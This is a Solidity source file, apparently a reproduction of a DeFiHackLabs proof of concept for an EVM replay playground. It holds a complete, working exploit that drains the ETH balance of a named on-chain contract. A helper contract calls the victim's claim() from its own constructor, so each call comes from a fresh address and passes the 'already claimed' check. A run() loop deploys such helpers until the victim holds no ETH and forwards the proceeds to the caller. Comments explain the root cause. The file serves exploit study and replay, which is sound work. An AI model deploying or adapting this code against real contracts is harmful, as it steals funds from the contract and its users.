// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-05-unverified_91a1).
//
// The DeFiHackLabs PoC (test/unverified_91a1_exp.sol) runs the whole attack
// INLINE in ContractTest.testExploit(): a `while (VULNERABLE.balance > 0)`
// loop that deploys fresh `ConstructorClaimHelper` contracts, each of which
// calls the unverified victim's `claim()` from its OWN CONSTRUCTOR and
// forwards whatever ETH it receives to `profitReceiver`. There is no
// standalone exploit contract in the original test — `testExploit()` itself
// is the deployer loop. Because recordExploit.ts always deploys the exploit
// contract UNRECORDED and then records exactly one function call (a
// constructor can never be the recorded call, and a `while` loop spanning
// many separate top-level `new` deployments cannot be captured as unrecorded
// "setup" either, since draining the victim IS the attack), this is
// reproduced as a SYNTHETIC exploit: `Unverified91a1Drain.run()` (the
// recorded entrypoint) reproduces the deployer loop itself, moved into a
// callable function. Logic and constants are copied verbatim from
// test/unverified_91a1_exp.sol's `testExploit()` / `ConstructorClaimHelper`.
//
// Root cause (reconstructed from the trace, victim is UNVERIFIED — see
// unverified_91a1_exp.md): the victim's public `claim()` pays a fixed ETH
// chunk to `msg.sender` and marks that address as having claimed. Since a
// freshly `CREATE`d contract address has never been seen before, calling
// `claim()` from that new contract's OWN CONSTRUCTOR always passes the
// "already claimed?" check (the contract also has `extcodesize == 0` at that
// point, so even a naive isContract() guard would not have helped). Looping
// fresh constructor-time claimants drains the victim's entire balance.

address constant VULNERABLE = 0x91a1dd68dC0Ba6526d560Ba9E9a3715E0634193D;

interface IUnverified91a1 {
    function claim() external returns (uint256);
}

// Mirrors ConstructorClaimHelper from test/unverified_91a1_exp.sol verbatim:
// calls claim() from the constructor (a brand-new, never-seen address), then
// forwards whatever native ETH it received on to `profitReceiver`.
contract ConstructorClaimHelper {
    constructor(address payable profitReceiver) {
        IUnverified91a1(VULNERABLE).claim();

        (bool ok, ) = profitReceiver.call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    receive() external payable {}
}

contract Unverified91a1Drain {
    // Mirrors testExploit()'s `while (VULNERABLE.balance > 0) { try new
    // ConstructorClaimHelper(profitReceiver) {...} catch { break; } }` loop,
    // moved into a callable entrypoint so the recorder can capture it as the
    // single recorded call after an unrecorded deploy. `profitReceiver` is
    // `msg.sender` (the attacker EOA), mirroring the test's
    // `attacker = profitReceiver`.
    function run() external {
        address payable profitReceiver = payable(msg.sender);

        while (VULNERABLE.balance > 0) {
            try new ConstructorClaimHelper(profitReceiver) {
                // successful claim + forward; loop continues while the
                // victim still holds ETH.
            } catch {
                break;
            }
        }
    }
}
